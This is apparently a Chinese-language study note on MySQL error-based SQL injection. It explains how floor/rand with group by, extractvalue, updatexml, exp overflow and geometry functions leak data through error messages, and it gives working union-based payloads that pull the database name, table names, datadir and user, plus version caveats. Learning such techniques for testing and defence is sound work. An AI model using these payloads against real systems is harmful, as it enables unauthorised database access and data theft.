0x01 floor()

floor(x)函数，向下取整，返回一个不大于x的值
round(x,d)函数，根据四舍五入保留指定的小数位数，x是要处理的数，d是保留几位小数
rand()函数，产生一个0-1之间的随机浮点数，若有参数x，则返回一个x对应的固定值。
count(column_name)函数，返回指定列的值的数目(NULL不计入)
count(*)函数，返回表中的记录数
group by语句用于结合合计函数，根据一个或多个列对结果集进行分组。

当count(*)计数函数和group by 执行前会创建一个虚拟表：

在虚拟表中的key(name)为主键是不可重复的。

第一次执行floor(rand(0)*2) 此时虚拟表中是空的，主键key 是 rand产生的随机数(因为floor限制 只会产生1、0）。因为xiao3表有4条数据，那么rand函数要执行4次。此时就必然会出现主键不唯一的情况。进而产生报错。

payload：

select * from xiao3 where id=1 union select 1 from(select count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)b ;

payload：

select * from xiao3 where id=1 union select 1 from(select count(*),concat(0x7e,(select table_name from information_schema.tables limit 1,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)b ;
select count(*) from test.test group by concat((floor(rand(0)*2)),"~",(select schema_name from information_schema.schemata limit 3,1));

需要注意子查询一次只能返回一行。

0x02 extractvalue()

extractvalue(xml_frag,xpath_expr) 函数使用Xpath表示法从XML字符串中提取值
xml_frag：目标xml文档
xpath_expr：利用xpath路径法表示的路径

利用xpath语法格式错误进而引发报错。

payload：

select * from xiao3 where id=1 union select extractvalue(1,concat(0x7e,(select @@datadir)));

0x03 updatexml()

updatexml(xml_document,xpath-string,new_value)改变文档中符合条件的节点的值
xml_document：string格式，为xml文档对象名称
xpath-string：xpath格式字符串
new_value：string格式，替换查找到的符合条件的数据

报错同extractvalue()的Xpath格式错误引发报错。

updatexml正常使用：

报错payload：

select * from xiao3 where id=1 union select updatexml(1,concat(0x7e,(select @@datadir)),1);

0x04 exp()

exp()是以e为底的指数函数，如果传递的数太大了，当大于709时，exp()就会因为溢出报错。

0的取反是一个很大的数，同样的如果我们使用子查询并且对其取反，那他也是一个很大的数。完全突破了exp的范围。

利用将被取反的子查询放入到exp的参数位置，就可以引起报错了。 exp(~(select @@datadir));

但是因为mysql版本问题，注入不出数据

0x05 几何函数报错

geometrycollection()
multiponint()
polygon()
multipolygon()
linestring()
multilinestring()

以上六个都是几何函数，函数对参数的要求格式为(1 2,3 3,2 2 1)。但是版本限制多，也是难用 select geometrycollection((select * from(select * from(select user())a)b));

最后总结一下版本问题：(版本问题因为比较难试，有可能不准确)

exp()溢出报错：5.5<mysql版本<5.6。 updatexml()、extractvalue()：大于5.1版本 (回显数据有32位长度的限制 ) floor() ：mysql 5.x版本 bigint 溢出报错：5.5.5以上
